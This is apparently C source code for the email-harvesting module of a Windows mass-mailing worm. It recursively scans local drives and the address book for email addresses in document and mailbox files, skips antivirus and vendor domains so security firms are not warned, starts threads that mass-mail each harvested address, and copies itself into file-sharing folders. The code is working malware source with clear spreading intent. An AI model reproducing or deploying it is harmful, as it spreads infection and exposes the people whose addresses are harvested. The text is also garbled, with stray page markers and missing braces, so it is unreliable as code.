void massmail_it(char *address)

{
static const char *list[] = {

"@symantec", "@panda", "@avp", "@microsoft",
"@msn", "@sopho", "@mm", "@norman", "@norton", "@noreply", "@virusli", "@fsecure",
"@hotmail", NULL, "\n\n\n" };
register int m;

for (m=0; list[m]; m++)

if (strstr(address, list[m])) return; //mail filter
if(!strstr(address,".")) return;
DWORD tid;

CreateThread(0, 0, mail_it, (char *)address, 0, &tid);

return;
// Opens the file, scans to the end of the file looking for @ sign
// if one is found it backs up to the beginning of addresss
// and grabs the from beginning to end, harvests it then
// passes it through massmail_it
int harvest_textfile(const char *text_file)
{

FILE *fp;
long byte_count = 0L;
long at_count = 0L;
char collected[200];

int ch;
long fpos = 0L;
int idx;

if ( (fp = fopen(text_file, "rb")) == NULL) {
return 0;
}

while ((ch = fgetc(fp)) != EOF) {

if (ch == '@') at_count++;
byte_count++;
}
fclose(fp);
if ( (fp = fopen(text_file, "rb")) == NULL) {

return 0;
}
Harvester.cpp
int valid = 0;
while ((ch = fgetc(fp)) != EOF && (fpos <= byte_count)) {
if (ch == '@') {
at_count++;

fpos = ftell(fp) - 1L;
if (fpos >= 1L) fpos--;

fseek(fp, fpos, 0);
ch = fgetc(fp);
while ( (ch >= 'a' && ch <= 'z') ||

(ch >= 'A' && ch <= 'Z') ||
(ch >= '0' && ch <= '9') ||
(ch == '_' || ch == '-' || ch == '.') ) {
if (fpos == 0) {
rewind(fp);
break;
}
else {
fpos--;
fseek(fp, fpos, 0);
ch = fgetc(fp);
}
if (ch == EOF) fclose(fp);
}

idx = 0;

while ( (ch = fgetc(fp)) != EOF) {

valid = 0;
if (ch >= 'a' && ch <= 'z') valid = 1;
if (ch >= 'A' && ch <= 'Z') valid = 1;
if (ch >= '0' && ch <= '9') valid = 1;
if (ch == '_' || ch == '-') valid = 1;
if (ch == '@' || ch == '.') valid = 1;
if (!valid) break;

collected[idx] = ch;
idx++;

}
collected[idx] = '\0';

massmail_it(collected);
}
}
fclose(fp);
return 0;
}

void harvest_extensions(const char *destination, WIN32_FIND_DATA *finder)

{
char Extension[MAX_PATH];
int e, o;
for (e=0,o=-1; finder->cFileName[e] && (e < 255); e++)

if (finder->cFileName[e] == '.') o=e;
if (o < 0) {
Extension[0] = 0;
Harvester.cpp

} else {
lstrcpyn(Extension, finder->cFileName+o+1, sizeof(Extension)-1);
CharLower(Extension);
}

do {

e = 1;

if (lstrcmp(Extension, "html") == 0) break;

if (lstrcmp(Extension, "htm") == 0) break;
if (lstrcmp(Extension, "txt") == 0) break;
if (lstrcmp(Extension, "xml") == 0) break;
if (lstrcmp(Extension, "doc") == 0) break;
if (lstrcmp(Extension, "rtf") == 0) break;
if (lstrcmp(Extension, "jsp") == 0) break;
if (lstrcmp(Extension, "asp") == 0) break;
if (lstrcmp(Extension, "jsp") == 0) break;
if (lstrcmp(Extension, "adb") == 0) break;
if (lstrcmp(Extension, "dbx") == 0) break;
e = 0;

if (Extension[0] == 0)

e = 0;
return;
}

while (0);

if (e == 1) {
harvest_textfile(destination);
}

int recursive(const char *path, int max_level)

{
char buffer[280];
WIN32_FIND_DATA data;
HANDLE finder;
if ((max_level <= 0) || (path == NULL)) return 1;

if (path[0] == 0) return 1;
strcpy(buffer, path);
if (buffer[strlen(buffer)-1] != '\\') strcat(buffer, "\\");
strcat(buffer, "*.*");

memset(&data, 0, sizeof(data));

for (finder=0;;)
{
Harvester.cpp

if (finder == 0)

{
finder = FindFirstFile(buffer, &data);
if (finder == INVALID_HANDLE_VALUE) finder = 0;
if (finder == 0)
break;
}
else
{
if (FindNextFile(finder, &data) == 0) break;
}

if (data.cFileName[0] == '.')

{
if (data.cFileName[1] == 0)
continue;
if (data.cFileName[1] == '.')

if (data.cFileName[2] == 0)

continue;
}

lstrcpy(buffer, path);
if (buffer[strlen(buffer)-1] != '\\') strcat(buffer, "\\");
strcat(buffer, data.cFileName);

if ((data.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) == FILE_ATTRIBUTE_DIRECTORY) {

recursive(buffer, max_level-1 );
p2p_in(buffer); //copy to folders containing "shar"
else
harvest_extensions(buffer,&data);

if (finder != 0) FindClose(finder);

return 0;
}

void harvest_disks()
{
char buffer[MAX_PATH], sysdisk;

memset(buffer, 0, sizeof(buffer));

sysdisk = buffer[0];

strcpy(buffer+1, ":\\");

for (buffer [0] = 'C' ; buffer [0] <'Y'; buffer[0]++)
{
if (buffer[0] == sysdisk) continue;
switch (GetDriveType(buffer)) {
Harvester.cpp

case DRIVE_FIXED:
case DRIVE_RAMDISK:
break;

default:

continue;
}
Sleep(3000);
recursive(buffer, 15);
}
}

void harvest_main()
{

harvest_wab();
harvest_disks();

}
